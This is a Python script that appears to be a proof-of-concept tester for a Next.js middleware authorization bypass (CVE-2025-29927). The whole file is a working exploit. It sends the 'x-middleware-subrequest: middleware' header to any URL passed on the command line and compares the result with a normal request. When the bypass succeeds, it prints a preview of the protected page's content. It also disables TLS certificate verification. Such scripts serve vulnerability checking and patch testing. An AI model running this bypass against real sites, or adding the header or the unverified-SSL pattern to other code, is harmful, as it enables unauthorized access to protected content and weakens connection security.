import sys
import ssl
import urllib.parse
import http.client
import re

def make_request(url, headers=None):
    if headers is None:
        headers = {}

    parsed_url = urllib.parse.urlparse(url)
    port = parsed_url.port
    if not port:
        port = 443 if parsed_url.scheme == 'https' else 80

    conn_class = http.client.HTTPSConnection if parsed_url.scheme == 'https' else http.client.HTTPConnection

    if parsed_url.scheme == 'https':
        context = ssl._create_unverified_context()  # Ignore SSL cert errors
        conn = conn_class(parsed_url.hostname, port, context=context)
    else:
        conn = conn_class(parsed_url.hostname, port)

    path = parsed_url.path or '/'
    if parsed_url.query:
        path += '?' + parsed_url.query

    try:
        conn.request('GET', path, headers=headers)
        response = conn.getresponse()
        body = response.read().decode(errors='ignore')
        location = response.getheader('Location')
        return {
            'status_code': response.status,
            'headers': dict(response.getheaders()),
            'body': body,
            'location': location
        }
    except Exception as e:
        raise e
    finally:
        conn.close()


def test_vulnerability(target_url):
    print('\n=== Next.js CVE-2025-29927 Middleware Bypass Tester ===\n')
    print(f'Target: {target_url}\n')

    try:
        print('Testing vulnerability...')

        print('Making request without bypass header...')
        normal_response = make_request(target_url)

        print('Making request with bypass header...')
        bypass_response = make_request(target_url, headers={'x-middleware-subrequest': 'middleware'})

        print(f'Normal request status: {normal_response["status_code"]}')
        print(f'Bypass request status: {bypass_response["status_code"]}')

        normal_status = normal_response['status_code']
        bypass_status = bypass_response['status_code']

        if normal_status != 200 and bypass_status == 200:
            print('\n⚠️  VULNERABLE')
            print('The route is protected (normal request blocked) but accessible with the bypass header\n')

            print('Content preview with bypass:')
            print('----------------------------------------')

            # Remove HTML tags and normalize whitespace
            body_preview = re.sub(r'<[^>]*>', '', bypass_response['body'])
            body_preview = re.sub(r'\s+', ' ', body_preview).strip()
            preview = body_preview[:300]
            if len(body_preview) > 300:
                preview += '...'
            print(preview)
            print('----------------------------------------')

        elif normal_status == 200 and bypass_status == 200:
            print('\n✓ NOT VULNERABLE - Public Route')
            print('The route is accessible without authentication (public route)')
        elif normal_status != 200 and bypass_status != 200:
            print('\n✓ NOT VULNERABLE - Protected Route')
            print('The route is protected and the bypass attempt was unsuccessful')
        else:
            print('\n⚠️  UNEXPECTED BEHAVIOR')
            print(f'Normal request: {normal_status}, Bypass request: {bypass_status}')
            print('This behavior requires manual investigation')

        if normal_response['location']:
            print(f'Normal request redirected to: {normal_response["location"]}')
        if bypass_response['location']:
            print(f'Bypass request redirected to: {bypass_response["location"]}')

    except Exception as e:
        print(f'\nError: {e}')
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = 'http://localhost:3000/dashboard'

    # Validate URL
    try:
        parsed = urllib.parse.urlparse(target)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError
    except Exception:
        print(f'Invalid URL: {target}')
        sys.exit(1)

    test_vulnerability(target)

